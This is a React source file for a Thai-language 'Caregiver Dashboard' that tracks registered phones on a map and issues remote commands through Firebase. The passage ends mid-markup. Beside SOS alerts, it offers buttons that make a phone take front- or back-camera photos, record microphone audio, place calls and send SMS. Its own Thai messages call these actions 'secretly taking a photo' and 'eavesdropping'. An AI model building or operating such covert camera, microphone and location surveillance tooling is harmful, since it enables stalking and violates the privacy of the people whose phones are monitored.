import React, { useState, useEffect } from 'react';

import { collection, onSnapshot, doc, setDoc, serverTimestamp, query } from "firebase/firestore";

import { db } from "./firebase-init";

import { MapContainer, TileLayer, Marker, Popup, useMap } from 'react-leaflet';

import 'leaflet/dist/leaflet.css';

import L from 'leaflet';



// Fix leaflet icon issue in react

delete L.Icon.Default.prototype._getIconUrl;

L.Icon.Default.mergeOptions({

  iconRetinaUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/images/marker-icon-2x.png',

  iconUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/images/marker-icon.png',

  shadowUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/images/marker-shadow.png',

});



// Component to auto-center map

function ChangeView({ center, zoom }) {

  const map = useMap();

  map.setView(center, zoom);

  return null;

}

  
  

// Robust coordinate parser to prevent crashes (supports Firestore GeoPoint, lat/lng maps, etc.)

function getLatLng(loc) {

  if (!loc) return null;

  const lat = loc.lat !== undefined ? loc.lat : loc.latitude;

  const lng = loc.lng !== undefined ? loc.lng : loc.longitude;

  if (lat === undefined || lng === undefined || lat === null || lng === null) return null;

  const parsedLat = parseFloat(lat);

  const parsedLng = parseFloat(lng);

  if (isNaN(parsedLat) || isNaN(parsedLng)) return null;

  return [parsedLat, parsedLng];

}

function connectionLabel(type) {
  return ({
    wifi: '📶 Wi‑Fi',
    cellular: '📱 เครือข่ายมือถือ',
    ethernet: '🔌 Ethernet',
    vpn: '🔒 VPN',
    bluetooth: '🟦 Bluetooth',
    offline: '⚪ ออฟไลน์',
    other: '🌐 อินเทอร์เน็ตอื่น ๆ',
  })[type] || '❔ ยังไม่มีข้อมูล';
}



function App() {

  const [devices, setDevices] = useState([]);

  const [selectedDeviceId, setSelectedDeviceId] = useState(null);

  

  // Scale-up features state

  const [searchQuery, setSearchQuery] = useState('');
  const [filterType, setFilterType] = useState('all'); // 'all', 'sos', 'low_battery', 'online'
  const [viewMode, setViewMode] = useState('detail'); // 'detail' or 'global_map'
  
  const selectedDevice = devices.find(d => d.id === selectedDeviceId);
  
  // Device specific state
  const [voiceMessage, setVoiceMessage] = useState('');
  const [toastMessage, setToastMessage] = useState('');
  const [location, setLocation] = useState(null);
  const [lastPhoto, setLastPhoto] = useState(null);
  const [takingPhoto, setTakingPhoto] = useState(false);
  const [lastAudio, setLastAudio] = useState(null);
  const [isRecordingAudio, setIsRecordingAudio] = useState(false);
  const [cameraFacing, setCameraFacing] = useState('front'); // 'front' | 'back'

  // Fetch all devices
  useEffect(() => {
    const q = query(collection(db, "devices"));
    const unsub = onSnapshot(q, (querySnapshot) => {
      const devs = [];
      querySnapshot.forEach((doc) => {
        devs.push({ id: doc.id, ...doc.data() });
      });
      setDevices(devs);
      if (!selectedDeviceId && devs.length > 0) {
        setSelectedDeviceId(devs[0].id);
      }
    });
    return () => unsub();
  }, [selectedDeviceId]);

  // Listen to selected device state
  useEffect(() => {
    if (!selectedDeviceId) return;
    
    // Reset state when switching devices
    setLocation(null);
    setLastPhoto(null);
    setTakingPhoto(false);
    setLastAudio(null);
    setIsRecordingAudio(false);

    const unsub = onSnapshot(doc(db, "devices", selectedDeviceId), (docSnap) => {
      if (docSnap.exists()) {
        const data = docSnap.data();
        if (data.location) {
          setLocation(data.location);
        }
        if (data.lastPhotoBase64) {
          setLastPhoto(prev => {
            // Only reset takingPhoto if this is actually a new photo
            if (prev !== data.lastPhotoBase64) {
              setTakingPhoto(false);
            }
            return data.lastPhotoBase64;
          });
        }
        if (data.lastAudioBase64) {
          setLastAudio(prev => {
            if (prev !== data.lastAudioBase64) {
              setIsRecordingAudio(false);
            }
            return data.lastAudioBase64;
          });
        }
      }
    });
    return () => unsub();
  }, [selectedDeviceId]);

  const showToast = (message) => {
    setToastMessage(message);
    setTimeout(() => {
      setToastMessage('');
    }, 3000);
  };

  const handleSendCommand = async (deviceId, type, payload = null) => {
    if (!deviceId) return false;
    try {
      const cmd = { type, timestamp: serverTimestamp() };
      if (payload) cmd.payload = payload;
      await setDoc(doc(db, "commands", deviceId), cmd);
      return true;
    } catch (err) {
      console.error(err);
      return false;
    }
  };

  const handleSendVoiceMessage = async () => {
    if (!voiceMessage.trim()) return;
    const success = await handleSendCommand(selectedDeviceId, "voice_message", voiceMessage);
    if (success) {
      showToast("ส่งข้อความเสียงสำเร็จแล้ว!");
      setVoiceMessage('');
    } else {
      showToast('เกิดข้อผิดพลาดในการส่งข้อความ');
    }
  };

  const handleTriggerAlarm = async () => {
    const success = await handleSendCommand(selectedDeviceId, "trigger_alarm");
    if (success) showToast('ส่งคำสั่งให้เครื่องส่งเสียงร้องแล้ว!');
  };

  const handleFetchLocation = async (deviceId) => {
    showToast('กำลังสั่งดึงข้อมูลพิกัดล่าสุดจากมือถือ...');
    await handleSendCommand(deviceId, "fetch_location");
  };

  const handleTakePicture = async (cameraType = "front") => {
    setTakingPhoto(true);
    showToast(`ส่งคำสั่งแอบถ่ายรูป (กล้อง${cameraType === 'front' ? 'หน้า' : 'หลัง'}) แล้ว รอสักครู่...`);
    const success = await handleSendCommand(selectedDeviceId, "take_picture", cameraType);
    if (!success) {
      setTakingPhoto(false);
    } else {
      setTimeout(() => setTakingPhoto(false), 30000);
    }
  };

  const handleRecordAudio = async (action) => {
    setIsRecordingAudio(action === "start");
    showToast(action === "start" ? 'ส่งคำสั่งเริ่มดักฟังเสียงแล้ว' : 'ส่งคำสั่งหยุดดักฟังและขอไฟล์เสียงแล้ว');
    const success = await handleSendCommand(selectedDeviceId, "record_audio", action);
    if (!success) {
      setIsRecordingAudio(false);
    }
  };

  const handleToggleFlashlight = async (isOn) => {
    const success = await handleSendCommand(selectedDeviceId, "toggle_flashlight", isOn ? "on" : "off");
    if (success) showToast(isOn ? 'สั่งเปิดไฟฉายแล้ว' : 'สั่งปิดไฟฉายแล้ว');
  };





  const handleMaxVolume = async () => {

    const success = await handleSendCommand(selectedDeviceId, "max_volume");

    if (success) showToast('สั่งเร่งเสียงลำโพงดังสุดแล้ว');

  };



  const handleCheckBattery = async () => {

    showToast('กำลังขอข้อมูลแบตเตอรี่...');

    await handleSendCommand(selectedDeviceId, "check_battery");

  };



  const handleMakeCall = async () => {

    const number = prompt("กรุณาระบุเบอร์โทรศัพท์ที่ต้องการให้มือถือโทรออก:", "1669");

    if (number) {

      const success = await handleSendCommand(selectedDeviceId, "make_call", number);

      if (success) showToast(`สั่งโทรออกเบอร์ ${number} แล้ว`);

    }

  };



  const handleSendSms = async () => {

    const number = prompt("กรุณาระบุเบอร์โทรศัพท์ที่ต้องการให้มือถือส่ง SMS ขอความช่วยเหลือ:", "1669");

    if (number) {

      const success = await handleSendCommand(selectedDeviceId, "send_sms", number);

      if (success) showToast(`สั่งส่ง SMS ไปยัง ${number} แล้ว`);

    }

  };



  const dismissSos = async (deviceId) => {

    await setDoc(doc(db, "devices", deviceId), { sosActive: false }, { merge: true });

    showToast('ปิดรับการแจ้งเตือน SOS สำเร็จ');

  };



  const handleClearPhoto = async () => {

    if (!selectedDeviceId) return;

    try {

      await setDoc(doc(db, "devices", selectedDeviceId), { lastPhotoBase64: null }, { merge: true });

      showToast('ลบรูปภาพล่าสุดออกจากระบบแล้ว');

    } catch (err) {

      console.error(err);

    }

  };



  const handleClearAudio = async () => {

    if (!selectedDeviceId) return;

    try {

      await setDoc(doc(db, "devices", selectedDeviceId), { lastAudioBase64: null }, { merge: true });

      showToast('ลบไฟล์เสียงล่าสุดออกจากระบบแล้ว');

    } catch (err) {

      console.error(err);

    }

  };




  const sosDevices = devices.filter(d => d.sosActive);



  // Emergency beep sound when SOS is active

  useEffect(() => {

    if (sosDevices.length === 0) return;

    

    const playBeep = () => {

      try {

        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();

        const osc = audioCtx.createOscillator();

        const gain = audioCtx.createGain();

        osc.connect(gain);

        gain.connect(audioCtx.destination);

        osc.type = 'sine';

        osc.frequency.setValueAtTime(880, audioCtx.currentTime); // A5 note

        gain.gain.setValueAtTime(0.3, audioCtx.currentTime);

        gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.5);

        osc.start();

        osc.stop(audioCtx.currentTime + 0.5);



        setTimeout(() => {

          const osc2 = audioCtx.createOscillator();

          const gain2 = audioCtx.createGain();

          osc2.connect(gain2);

          gain2.connect(audioCtx.destination);

          osc2.type = 'sine';

          osc2.frequency.setValueAtTime(880, audioCtx.currentTime);

          gain2.gain.setValueAtTime(0.3, audioCtx.currentTime);

          gain2.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.5);

          osc2.start();

          osc2.stop(audioCtx.currentTime + 0.5);

        }, 200);

      } catch (e) {

        console.error("Audio beep failed", e);

      }

    };



    playBeep();

    const interval = setInterval(playBeep, 3000);

    return () => clearInterval(interval);

  }, [sosDevices.length]);



  // Search and Filter Logic

  const filteredDevices = devices.filter(device => {

    // 1. Search filter

    const searchLower = searchQuery.toLowerCase();

    const matchesSearch = (device.name && device.name.toLowerCase().includes(searchLower)) ||

                          (device.id && device.id.toLowerCase().includes(searchLower));

    

    // 2. Type filter

    let matchesFilter = true;

    if (filterType === 'sos') {

      matchesFilter = device.sosActive === true;

    } else if (filterType === 'low_battery') {

      matchesFilter = device.batteryLevel !== undefined && device.batteryLevel < 20;

    } else if (filterType === 'online') {

      matchesFilter = device.status === 'online';

    }



    return matchesSearch && matchesFilter;

  });



  return (
    <div className="h-screen bg-transparent text-slate-100 font-sans flex flex-col overflow-hidden relative">

      {/* Toast Notification */}

      {toastMessage && (

        <div className="fixed top-4 right-4 z-[9999] animate-bounce">

          <div className="bg-emerald-500 text-white px-6 py-3 rounded-lg shadow-xl font-medium flex items-center gap-2 border border-emerald-400">

            {toastMessage}

          </div>

        </div>

      )}



      {/* Global SOS Header */}
      {sosDevices.length > 0 && (
        <div className="w-full bg-red-950/80 backdrop-blur-xl border-b border-red-500/50 shadow-[0_4px_30px_rgba(239,68,68,0.4)] z-50 sos-glow relative overflow-hidden">
          <div className="absolute inset-0 bg-gradient-to-r from-red-600/10 via-red-500/5 to-red-600/10 animate-[pulse_4s_ease-in-out_infinite]"></div>
          <div className="max-w-7xl mx-auto px-4 py-3 relative z-10">

            <h2 className="text-white font-bold text-lg mb-2 flex items-center gap-2">

              🚨 การแจ้งเตือนฉุกเฉิน (SOS Alerts)

            </h2>

            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">

              {sosDevices.map(device => (

                <div key={device.id} className="bg-white/10 rounded-lg p-3 flex items-center justify-between border border-red-400/50">

                  <div>

                    <div className="font-bold text-white">{device.name || 'Unknown Device'}</div>

                    <div className="text-red-200 text-xs">ต้องการความช่วยเหลือด่วน!</div>

                  </div>

                  <div className="flex gap-2">

                    <button 

                      onClick={() => setSelectedDeviceId(device.id)}

                      className="bg-white text-red-600 px-3 py-1.5 rounded text-xs font-bold hover:bg-red-50 transition-colors"

                    >

                      ดูข้อมูล

                    </button>

                    <button 

                      onClick={() => dismissSos(device.id)}

                      className="border border-white/50 text-white px-3 py-1.5 rounded text-xs hover:bg-white/20 transition-colors"

                    >

                      ปิดรับแจ้ง

                    </button>

                  </div>

                </div>

              ))}

            </div>

          </div>

        </div>

      )}



      <div className="flex flex-1 overflow-hidden h-full">
        {/* Sidebar - Device List */}
        <div className="w-72 bg-slate-900/40 backdrop-blur-2xl border-r border-slate-700/50 flex flex-col h-full shadow-[4px_0_24px_rgba(0,0,0,0.2)] z-10">
          <div className="p-5 border-b border-slate-700/50 bg-slate-900/40 flex items-center gap-3">

            <div className="w-10 h-10 rounded-xl bg-gradient-to-tr from-indigo-500 to-purple-500 flex items-center justify-center shadow-lg shadow-indigo-500/30">

              <span className="text-white font-bold text-lg">AP</span>

            </div>

            <div>

              <div className="font-bold text-lg bg-clip-text text-transparent bg-gradient-to-r from-indigo-400 to-purple-400">

                Nong Kanvela

              </div>

              <div className="text-xs text-slate-400">Caregiver Dashboard</div>

            </div>

          </div>

          

          <div className="p-4 flex-1 overflow-y-auto">

            

            {/* Search Bar */}

            <div className="mb-4">

              <input 

                type="text" 

                placeholder="ค้นหาชื่อ หรือ ID..." 

                value={searchQuery}

                onChange={(e) => setSearchQuery(e.target.value)}

                className="w-full bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-slate-200 focus:outline-none focus:border-indigo-500"

              />

            </div>



            {/* Quick Filters */}

            <div className="flex flex-wrap gap-2 mb-4">

              <button 

                onClick={() => setFilterType('all')}

                className={`text-xs px-2 py-1 rounded-md transition-colors ${filterType === 'all' ? 'bg-indigo-500 text-white' : 'bg-slate-700/50 text-slate-400 hover:bg-slate-700'}`}

              >

                ทั้งหมด

              </button>

              <button 

                onClick={() => setFilterType('sos')}

                className={`text-xs px-2 py-1 rounded-md transition-colors ${filterType === 'sos' ? 'bg-red-500 text-white' : 'bg-slate-700/50 text-slate-400 hover:bg-slate-700'}`}

              >

                SOS

              </button>

              <button 

                onClick={() => setFilterType('low_battery')}

                className={`text-xs px-2 py-1 rounded-md transition-colors ${filterType === 'low_battery' ? 'bg-yellow-500 text-slate-900 font-bold' : 'bg-slate-700/50 text-slate-400 hover:bg-slate-700'}`}

              >

                แบตต่ำ

              </button>

              <button 

                onClick={() => setFilterType('online')}

                className={`text-xs px-2 py-1 rounded-md transition-colors ${filterType === 'online' ? 'bg-emerald-500 text-white' : 'bg-slate-700/50 text-slate-400 hover:bg-slate-700'}`}

              >

                ออนไลน์

              </button>

            </div>



            <div className="flex justify-between items-center mb-4 px-1">

              <h3 className="text-xs font-bold text-slate-400 uppercase tracking-wider">รายชื่อ ({filteredDevices.length})</h3>

              <button 

                onClick={() => setViewMode(viewMode === 'global_map' ? 'detail' : 'global_map')}

                className="text-xs text-indigo-400 hover:text-indigo-300 font-medium flex items-center gap-1"

              >

                {viewMode === 'global_map' ? 'ดูข้อมูลเดี่ยว' : '🗺️ แผนที่รวม'}

              </button>

            </div>



            <div className="space-y-3">

              {filteredDevices.map(device => (

                <button
                  key={device.id}
                  onClick={() => setSelectedDeviceId(device.id)}
                  className={`w-full text-left px-4 py-3 rounded-2xl transition-all flex items-center gap-4 relative overflow-hidden ${
                    selectedDeviceId === device.id 
                      ? 'bg-indigo-500/20 border border-indigo-500/50 shadow-[0_0_15px_rgba(99,102,241,0.15)]' 
                      : 'bg-slate-900/30 border border-transparent hover:bg-slate-800/50'
                  }`}
                >

                  <div className="relative z-10">

                    <div className={`w-12 h-12 rounded-full flex items-center justify-center text-xl ${device.sosActive ? 'bg-red-500/20 text-red-500' : 'bg-slate-800 text-slate-300'}`}>

                      {device.sosActive ? '🚨' : '👤'}

                    </div>

                    {device.sosActive && (

                      <div className="absolute -top-1 -right-1 w-4 h-4 bg-red-500 rounded-full animate-ping"></div>

                    )}

                    {device.status === 'online' && !device.sosActive && (

                      <div className="absolute bottom-0 right-0 w-3.5 h-3.5 bg-emerald-500 rounded-full border-2 border-slate-900"></div>

                    )}

                  </div>

                  <div className="flex-1 min-w-0 z-10">

                    <div className={`text-base font-bold truncate ${device.sosActive ? 'text-red-400' : 'text-slate-100'}`}>

                      {device.name || 'Unknown Device'}

                    </div>

                    <div className="text-xs text-slate-500 truncate mt-0.5">

                      {device.status === 'online' ? '🟢 ออนไลน์' : '⚪ ออฟไลน์'} • {connectionLabel(device.connectionType)} • ID: {device.id.substring(0,4)}

                    </div>

                  </div>

                  {/* Decorative background for selected item */}

                  {selectedDeviceId === device.id && (

                    <div className="absolute right-0 top-0 bottom-0 w-1 bg-indigo-500 rounded-l-full"></div>

                  )}

                </button>

              ))}

              {filteredDevices.length === 0 && (

                <div className="text-sm text-slate-500 text-center py-8 bg-slate-900/30 rounded-xl border border-slate-800 border-dashed">

                  ไม่พบข้อมูล

                </div>

              )}

            </div>

          </div>

        </div>



        {/* Main Content */}
        <div className="flex-1 overflow-y-auto h-full bg-transparent relative">

          

          {viewMode === 'global_map' ? (

            <div className="absolute inset-0 z-0">

              <MapContainer 

                center={[13.7563, 100.5018]} 

                zoom={6} 

                style={{ height: '100%', width: '100%', zIndex: 0 }}

              >

                <TileLayer

                  url="https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png"

                  attribution='&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'

                />

                

                {/* Render all devices with locations */}

                {devices.filter(d => getLatLng(d.location)).map(device => {

                  const latLng = getLatLng(device.location);

                  let markerColor = 'blue';

                  if (device.sosActive) markerColor = 'red';

                  else if (device.batteryLevel < 20 || device.status === 'offline') markerColor = 'yellow';

                  else if (device.status === 'online') markerColor = 'green';

                  

                  // Custom marker based on color

                  const customIcon = new L.Icon({

                    iconUrl: `https://raw.githubusercontent.com/pointhi/leaflet-color-markers/master/img/marker-icon-2x-${markerColor}.png`,

                    shadowUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/images/marker-shadow.png',

                    iconSize: [25, 41],

                    iconAnchor: [12, 41],

                    popupAnchor: [1, -34],

                    shadowSize: [41, 41]

                  });



                  return (

                    <Marker 

                      key={device.id} 

                      position={latLng}

                      icon={customIcon}

                      eventHandlers={{

                        click: () => {

                          setSelectedDeviceId(device.id);

                          setViewMode('detail');

                        },

                      }}

                    >

                      <Popup>

                        <div className="text-center font-sans">

                          <strong className={device.sosActive ? 'text-red-600' : 'text-slate-800'}>

                            {device.name || 'Unknown Device'}

                          </strong><br/>

                          {device.sosActive && <span className="text-red-500 text-xs font-bold block">🚨 SOS Active</span>}

                          {device.batteryLevel !== undefined && <span className="text-xs text-slate-500 block">🔋 แบตเตอรี่: {device.batteryLevel}%</span>}

                          <button 

                            onClick={() => {

                              setSelectedDeviceId(device.id);

                              setViewMode('detail');

                            }}

                            className="mt-2 bg-indigo-500 text-white text-xs px-2 py-1 rounded w-full"

                          >

                            ดูรายละเอียด

                          </button>

                        </div>

                      </Popup>

                    </Marker>

                  );

                })}

              </MapContainer>

              

              <div className="absolute top-4 left-4 z-[400] bg-white/90 p-3 rounded-lg shadow-lg border border-slate-200">

                <h4 className="font-bold text-slate-800 text-sm mb-2">สรุปสถานะ (Global)</h4>

                <div className="space-y-1 text-xs text-slate-600">

                  <div className="flex items-center gap-2"><span className="w-3 h-3 rounded-full bg-red-500 inline-block"></span> SOS: {devices.filter(d => d.sosActive).length}</div>

                  <div className="flex items-center gap-2"><span className="w-3 h-3 rounded-full bg-emerald-500 inline-block"></span> ออนไลน์: {devices.filter(d => d.status === 'online' && !d.sosActive && d.batteryLevel >= 20).length}</div>

                  <div className="flex items-center gap-2"><span className="w-3 h-3 rounded-full bg-yellow-500 inline-block"></span> แบตต่ำ/ออฟไลน์: {devices.filter(d => (d.status === 'offline' || d.batteryLevel < 20) && !d.sosActive).length}</div>

                  <div className="flex items-center gap-2"><span className="w-3 h-3 rounded-full bg-blue-500 inline-block"></span> อัปเดตพิกัดแล้ว: {devices.filter(d => d.location).length}/{devices.length}</div>

                </div>

              </div>

            </div>

          ) : !selectedDeviceId ? (

            <div className="flex flex-col items-center justify-center h-full text-slate-500">

              <div className="text-6xl mb-4 opacity-20">📱</div>

              <div className="text-lg">เลือกรายชื่อทางซ้ายเพื่อดูข้อมูล</div>

            </div>

          ) : (

            <main className="max-w-7xl mx-auto px-6 py-8">

              

              <div className="mb-8 flex items-end justify-between">

                <div>

                  <h1 className="text-3xl font-extrabold tracking-tight text-white mb-1 flex items-center gap-3">

                    ข้อมูลของ: <span className="text-indigo-400">{selectedDevice?.name || 'Device'}</span>

                    {selectedDevice?.batteryLevel !== undefined && (

                      <span className={`text-sm px-3 py-1 rounded-full border ${selectedDevice.batteryLevel > 20 ? 'bg-emerald-500/20 border-emerald-500/50 text-emerald-400' : 'bg-red-500/20 border-red-500/50 text-red-400'} flex items-center gap-1`}>

                        🔋 {selectedDevice.batteryLevel}%

                      </span>

                    )}

                    <span className="text-sm px-3 py-1 rounded-full border bg-sky-500/15 border-sky-500/40 text-sky-300 flex items-center gap-1">
                      {connectionLabel(selectedDevice?.connectionType)}
                    </span>

                  </h1>

                  <p className="text-slate-400 text-sm">อัปเดตข้อมูลแบบเรียลไทม์จากแอปพลิเคชัน</p>

                </div>

              </div>



              <div className="grid grid-cols-1 xl:grid-cols-3 gap-6">

                

                {/* 1. Map View (Takes 2/3 of space on large screens) */}

                <div className="xl:col-span-2 flex flex-col gap-6">

                  

                  {/* Map Panel */}
                  <div className="bg-slate-900/40 backdrop-blur-xl border border-slate-700/50 rounded-[2rem] p-1.5 shadow-[0_8px_32px_rgba(0,0,0,0.4)] relative overflow-hidden flex flex-col h-[550px] animate-float" style={{ animationDelay: '0s' }}>
                    <div className="px-6 py-4 flex justify-between items-center bg-slate-800/40 border-b border-slate-700/50 rounded-t-3xl z-10">

                      <div className="flex items-center gap-3">

                        <span className="text-2xl">🗺️</span>

                        <h2 className="text-lg font-bold text-slate-100">ตำแหน่งปัจจุบัน (Live Location)</h2>

                      </div>

                      <button onClick={() => handleFetchLocation(selectedDeviceId)} className="text-sm bg-indigo-600/20 hover:bg-indigo-600/40 text-indigo-400 border border-indigo-500/30 px-4 py-2 rounded-xl transition-colors font-medium flex items-center gap-2">

                        <span>🔄</span> อัปเดตพิกัด

                      </button>

                    </div>

                    <div className="w-full flex-1 z-0 relative">

                      {getLatLng(location) ? (

                        <MapContainer center={getLatLng(location)} zoom={15} style={{ height: '100%', width: '100%', zIndex: 0 }}>

                          <TileLayer

                            url="https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png"

                            attribution='&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'

                          />

                           {/* Custom marker icon based on SOS status */}

                          {(() => {

                            const markerColor = selectedDevice?.sosActive ? 'red' : 'blue';

                            const customIcon = new L.Icon({

                              iconUrl: `https://raw.githubusercontent.com/pointhi/leaflet-color-markers/master/img/marker-icon-2x-${markerColor}.png`,

                              shadowUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/images/marker-shadow.png',

                              iconSize: [25, 41],

                              iconAnchor: [12, 41],

                              popupAnchor: [1, -34],

                              shadowSize: [41, 41]

                            });



                            return (

                              <Marker position={getLatLng(location)} icon={customIcon}>

                                <Popup>

                                  <div className="text-center font-sans">

                                    <strong>พิกัดล่าสุด</strong><br />

                                    {getLatLng(location)[0].toFixed(5)}, {getLatLng(location)[1].toFixed(5)}

                                  </div>

                                </Popup>

                              </Marker>

                            );

                          })()}

                          <ChangeView center={getLatLng(location)} zoom={16} />

                        </MapContainer>

                      ) : (

                        <div className="w-full h-full bg-slate-800/50 flex flex-col gap-3 items-center justify-center text-slate-500">

                          <span className="text-4xl animate-pulse">📍</span>

                          <span>กำลังรอข้อมูลตำแหน่งพิกัด...</span>

                        </div>

                      )}

                    </div>

                  </div>



                </div>



                {/* 2. Controls & Camera View */}

                <div className="space-y-4 flex flex-col">



                  {/* Panel 1: EMERGENCY SOS (only when active — floats on top) */}
                  {selectedDevice?.sosActive && (
                    <div className="bg-red-950/80 backdrop-blur-xl border-2 border-red-500/80 rounded-[2rem] p-5 shadow-[0_8px_32px_rgba(239,68,68,0.4)] sos-glow animate-float" style={{ animationDelay: '0.5s' }}>

                      <div className="flex items-center gap-2 mb-3">

                        <span className="text-2xl">🚨</span>

                        <h2 className="text-md font-extrabold text-red-400">อยู่ระหว่างแจ้งเหตุ SOS ด่วนที่สุด!</h2>

                      </div>

                      <div className="space-y-2">

                        <button

                          onClick={handleMakeCall}

                          className="w-full flex items-center justify-center gap-2 bg-red-600 hover:bg-red-500 text-white py-3.5 rounded-2xl text-sm font-bold shadow-lg shadow-red-500/20 transition-colors"

                        >

                          📞 สั่งให้โทรกลับหาแอดมินด่วน

                        </button>

                        <button

                          onClick={() => handleTakePicture('front')}

                          disabled={takingPhoto}

                          className="w-full flex items-center justify-center gap-2 bg-red-700 hover:bg-red-600 disabled:opacity-50 text-white py-3.5 rounded-2xl text-sm font-bold transition-colors"

                        >

                          📸 {takingPhoto ? 'กำลังถ่ายรูป...' : 'ถ่ายรูปสภาพแวดล้อม'}

                        </button>

                        <button

                          onClick={handleTriggerAlarm}

                          className="w-full flex items-center justify-center gap-2 bg-amber-600 hover:bg-amber-500 text-white py-3 rounded-2xl text-sm font-semibold transition-colors"

                        >

                          🚨 สั่งส่งเสียงไซเรน

                        </button>

                      </div>

                    </div>

                  )}



                  {/* Panel 2: Helper Tools — Always Visible */}
                  <div className="bg-slate-900/40 backdrop-blur-xl border border-slate-700/50 rounded-[2rem] p-6 shadow-[0_8px_32px_rgba(0,0,0,0.4)] animate-float" style={{ animationDelay: '1s' }}>

                    <h2 className="text-sm font-bold mb-4 text-slate-400 uppercase tracking-wider">

                      🛠️ คำสั่งช่วยเหลือ (Helper Tools)

                    </h2>

                    <div className="space-y-3">



                      {/* Row 1: Flashlight */}

                      <div className="grid grid-cols-2 gap-2">

                        <button onClick={() => handleToggleFlashlight(true)} className="flex items-center justify-center gap-1 bg-slate-800 hover:bg-slate-700 text-slate-200 py-2.5 rounded-xl text-xs font-medium transition-colors">

                          🔦 เปิดไฟฉาย

                        </button>

                        <button onClick={() => handleToggleFlashlight(false)} className="flex items-center justify-center gap-1 bg-slate-800 hover:bg-slate-700 text-slate-200 py-2.5 rounded-xl text-xs font-medium transition-colors">

                          🔦 ปิดไฟฉาย

                        </button>

                      </div>



                      {/* Row 2: Volume & Battery */}

                      <div className="grid grid-cols-2 gap-2">

                        <button onClick={handleMaxVolume} className="flex items-center justify-center gap-1 bg-slate-800 hover:bg-slate-700 text-slate-200 py-2.5 rounded-xl text-xs font-medium transition-colors">

                          🔊 เร่งเสียงสุด

                        </button>

                        <button onClick={handleCheckBattery} className="flex items-center justify-center gap-1 bg-slate-800 hover:bg-slate-700 text-slate-200 py-2.5 rounded-xl text-xs font-medium transition-colors">

                          🔋 เช็คแบตเตอรี่

                        </button>

                      </div>



                      {/* Divider */}

                      <div className="border-t border-slate-800 pt-3 space-y-2">

                        {/* Record Audio */}
                        <button 
                          onClick={() => handleRecordAudio(isRecordingAudio ? "stop" : "start")} 
                          className={`w-full flex items-center justify-between px-4 py-2.5 rounded-xl text-xs font-medium transition-colors ${isRecordingAudio ? 'bg-red-900/50 hover:bg-red-800 border border-red-500/50 text-red-200' : 'bg-slate-800 hover:bg-slate-700 text-slate-200'}`}
                        >
                          <span>🎙️ {isRecordingAudio ? 'กำลังดักฟังเสียง... (กดเพื่อหยุด)' : 'เริ่มดักฟังเสียง (ไมค์)'}</span>
                          <span>{isRecordingAudio ? '⏹️' : '▶️'}</span>
                        </button>



                        {/* Take Picture — with camera selector */}

                        <div className="space-y-2">

                          {/* Camera toggle */}
                          <div className="flex rounded-xl overflow-hidden border border-slate-700">
                            <button
                              onClick={() => setCameraFacing('front')}
                              className={`flex-1 flex items-center justify-center gap-1 py-2 text-xs font-medium transition-colors ${
                                cameraFacing === 'front'
                                  ? 'bg-indigo-600 text-white'
                                  : 'bg-slate-800 text-slate-400 hover:bg-slate-700'
                              }`}
                            >
                              🤳 กล้องหน้า
                            </button>
                            <button
                              onClick={() => setCameraFacing('back')}
                              className={`flex-1 flex items-center justify-center gap-1 py-2 text-xs font-medium transition-colors ${
                                cameraFacing === 'back'
                                  ? 'bg-indigo-600 text-white'
                                  : 'bg-slate-800 text-slate-400 hover:bg-slate-700'
                              }`}
                            >
                              📷 กล้องหลัง
                            </button>
                          </div>

                          {/* Shoot button */}
                          <button
                            onClick={() => handleTakePicture(cameraFacing)}
                            disabled={takingPhoto}
                            className="w-full flex items-center justify-between bg-slate-800 hover:bg-slate-700 disabled:opacity-50 text-slate-200 px-4 py-2.5 rounded-xl text-xs font-medium transition-colors"
                          >
                            <span>📸 {takingPhoto ? 'กำลังสั่งถ่ายรูป...' : `ถ่ายรูปด้วยกล้อง${cameraFacing === 'front' ? 'หน้า' : 'หลัง'}`}</span>
                            <span>→</span>
                          </button>

                        </div>



                        {/* Call */}

                        <button onClick={handleMakeCall} className="w-full flex items-center justify-between bg-slate-800 hover:bg-slate-700 text-slate-300 px-4 py-2.5 rounded-xl text-xs font-medium transition-colors">

                          <span>📞 สั่งให้เครื่องโทรออก</span>

                          <span>→</span>

                        </button>



                        {/* SMS */}

                        <button onClick={handleSendSms} className="w-full flex items-center justify-between bg-slate-800 hover:bg-slate-700 text-slate-300 px-4 py-2.5 rounded-xl text-xs font-medium transition-colors">

                          <span>✉️ สั่งให้เครื่องส่ง SMS</span>

                          <span>→</span>

                        </button>



                      </div>

                    </div>

                  </div>



                  {/* Panel 3: TTS Text Reader */}

                  <div className="bg-slate-900 border border-slate-800 rounded-3xl p-5 shadow-2xl">

                    <h2 className="text-sm font-bold mb-3 text-slate-400 uppercase tracking-wider">

                      📢 ส่งเสียงพูด/เตือน (Speak Aloud)

                    </h2>

                    <div className="flex gap-2">

                      <input

                        type="text"

                        value={voiceMessage}

                        onChange={(e) => setVoiceMessage(e.target.value)}

                        onKeyDown={(e) => e.key === 'Enter' && handleSendVoiceMessage()}

                        placeholder="พิมพ์ข้อความเพื่อให้มือถือพูดออกเสียง..."

                        className="bg-slate-950 border border-slate-700 rounded-xl px-3 py-2 text-xs text-slate-200 flex-1 focus:outline-none focus:border-indigo-500"

                      />

                      <button onClick={handleSendVoiceMessage} className="bg-indigo-600 hover:bg-indigo-500 text-white px-4 py-2 rounded-xl text-xs font-bold transition-colors">

                        ส่งเสียง

                      </button>

                    </div>

                  </div>



                  {/* Camera Result */}

                  {lastPhoto && (

                    <div className="bg-slate-900 border border-slate-800 rounded-3xl overflow-hidden shadow-2xl flex flex-col">

                      <div className="px-6 py-4 bg-slate-900 border-b border-slate-800 flex justify-between items-center z-10">

